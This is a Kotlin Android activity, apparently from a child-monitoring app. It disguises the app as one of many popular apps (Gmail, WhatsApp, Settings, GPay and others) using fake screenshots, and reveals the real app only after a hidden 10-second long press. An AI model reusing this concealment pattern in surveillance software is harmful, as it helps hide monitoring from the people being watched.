package nexus.android.child.customization

import android.graphics.BitmapFactory
import android.os.Bundle
import android.util.Log
import android.view.GestureDetector
import android.view.MotionEvent
import android.widget.ImageView
import androidx.appcompat.app.AppCompatActivity
import nexus.android.child.MainActivity
import nexus.android.child.R
import nexus.android.child.utils.AppCustomizationManager
import nexus.android.child.utils.FakeUIManager

/**
 * Displays a fake UI screenshot corresponding to the selected app icon.
 * Screenshots are loaded from assets folder.
 * Users can long-press for 10 seconds to unlock and access the real app.
 */
class FakeUIActivity : AppCompatActivity() {

    private lateinit var fakeUIImageView: ImageView
    private lateinit var gestureDetector: GestureDetector
    private var longPressStartTime: Long = 0
    private var isLongPressDetected = false

    companion object {
        private const val TAG = "FakeUIActivity"
        private const val ASSETS_FOLDER = "fake_ui_screenshots"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_fake_ui)

        fakeUIImageView = findViewById(R.id.fake_ui_image)

        // Load the fake UI screenshot for the current icon
        val currentIcon = AppCustomizationManager.getCurrentIconType(this)
        loadFakeUIImage(currentIcon)

        // Setup gesture detection for long press unlock
        gestureDetector = GestureDetector(this, LongPressGestureListener())
    }

    override fun onTouchEvent(event: MotionEvent?): Boolean {
        if (event != null) {
            when (event.action) {
                MotionEvent.ACTION_DOWN -> {
                    longPressStartTime = System.currentTimeMillis()
                    isLongPressDetected = false
                }
                MotionEvent.ACTION_MOVE -> {
                    val elapsedTime = System.currentTimeMillis() - longPressStartTime
                    if (elapsedTime >= FakeUIManager.UNLOCK_PRESS_DURATION_MS && !isLongPressDetected) {
                        isLongPressDetected = true
                        unlockRealApp()
                    }
                }
                MotionEvent.ACTION_UP -> {
                    longPressStartTime = 0
                    isLongPressDetected = false
                }
            }
            return gestureDetector.onTouchEvent(event) || super.onTouchEvent(event)
        }
        return super.onTouchEvent(event)
    }

    private fun loadFakeUIImage(iconType: AppCustomizationManager.IconType) {
        try {
            val fileName = getFakeUIFileName(iconType)
            val assetPath = "$ASSETS_FOLDER/$fileName"
            
            val inputStream = assets.open(assetPath)
            val bitmap = BitmapFactory.decodeStream(inputStream)
            inputStream.close()
            
            if (bitmap != null) {
                fakeUIImageView.setImageBitmap(bitmap)
                Log.d(TAG, "Loaded fake UI: $assetPath")
            } else {
                Log.w(TAG, "Failed to decode bitmap: $assetPath")
                loadFallbackImage()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error loading fake UI image", e)
            loadFallbackImage()
        }
    }

    private fun loadFallbackImage() {
        // Fallback to a solid color if image not found
        fakeUIImageView.setBackgroundColor(android.graphics.Color.WHITE)
    }

    private fun getFakeUIFileName(iconType: AppCustomizationManager.IconType): String {
        return when (iconType) {
            AppCustomizationManager.IconType.DEFAULT -> "fake_ui_default.png"
            AppCustomizationManager.IconType.GMAIL -> "fake_ui_gmail.png"
            AppCustomizationManager.IconType.WHATSAPP -> "fake_ui_whatsapp.png"
            AppCustomizationManager.IconType.INSTAGRAM -> "fake_ui_instagram.png"
            AppCustomizationManager.IconType.SETTINGS -> "fake_ui_settings.png"
            AppCustomizationManager.IconType.YOUTUBE_MUSIC -> "fake_ui_youtube_music.png"
            AppCustomizationManager.IconType.CALCULATOR -> "fake_ui_calculator.png"
            AppCustomizationManager.IconType.TELEGRAM -> "fake_ui_telegram.png"
            AppCustomizationManager.IconType.SECURITY -> "fake_ui_security.png"
            AppCustomizationManager.IconType.CHATGPT -> "fake_ui_chatgpt.png"
            AppCustomizationManager.IconType.GOOGLE -> "fake_ui_google.png"
            AppCustomizationManager.IconType.GAME_BOOSTER -> "fake_ui_game_booster.png"
            AppCustomizationManager.IconType.GEMINI -> "fake_ui_gemini.png"
            AppCustomizationManager.IconType.GPAY -> "fake_ui_gpay.png"
            AppCustomizationManager.IconType.MAPS -> "fake_ui_maps.png"
            AppCustomizationManager.IconType.MESSAGES -> "fake_ui_messages.png"
            AppCustomizationManager.IconType.GOOGLE_ONE -> "fake_ui_google_one.png"
            AppCustomizationManager.IconType.PLAY_STORE -> "fake_ui_play_store.png"
            AppCustomizationManager.IconType.SPOTIFY -> "fake_ui_spotify.png"
            AppCustomizationManager.IconType.X -> "fake_ui_x.png"
            AppCustomizationManager.IconType.YOUTUBE -> "fake_ui_youtube.png"
        }
    }

    private fun unlockRealApp() {
        // Record the unlock time
        FakeUIManager.recordUnlockTime(this)

        // Disable fake UI for this icon so real app shows next time
        val currentIcon = AppCustomizationManager.getCurrentIconType(this)
        FakeUIManager.setFakeUIEnabled(this, currentIcon, false)

        // Check if app lock is enabled - if so, show lock screen instead of MainActivity
        val prefs = getSharedPreferences("phantom_prefs", MODE_PRIVATE)
        val deviceId = prefs.getString("device_id", null)
        if (deviceId != null) {
            nexus.android.child.applock.AppLockManager.initialize(this, deviceId)
        }
        
        if (nexus.android.child.applock.AppLockManager.isAppLockEnabled(this)) {
            // Reset icon to DEFAULT first to avoid component conflicts
            if (currentIcon != AppCustomizationManager.IconType.DEFAULT) {
                Log.d(TAG, "Resetting icon from ${currentIcon.name} to DEFAULT before app lock")
                AppCustomizationManager.changeAppIcon(this, AppCustomizationManager.IconType.DEFAULT)
            }
            
            // Show app lock screen
            try {
                val intent = android.content.Intent(this, nexus.android.child.applock.AppLockActivity::class.java)
                intent.flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP
                startActivity(intent)
                Log.d(TAG, "AppLockActivity started")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start AppLockActivity", e)
            }
        } else {
            // Reset icon to DEFAULT to avoid component conflicts
            if (currentIcon != AppCustomizationManager.IconType.DEFAULT) {
                Log.d(TAG, "Resetting icon from ${currentIcon.name} to DEFAULT")
                AppCustomizationManager.changeAppIcon(this, AppCustomizationManager.IconType.DEFAULT)
            }
            
            // Start the real MainActivity
            try {
                val intent = android.content.Intent(this, MainActivity::class.java)
                intent.flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP
                startActivity(intent)
                Log.d(TAG, "MainActivity started successfully")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start MainActivity", e)
            }
        }

        // Finish this fake UI activity
        finish()
    }

    private class LongPressGestureListener : GestureDetector.SimpleOnGestureListener() {
        override fun onLongPress(e: MotionEvent) {
            // Handled in onTouchEvent for continuous duration tracking
        }
    }
}
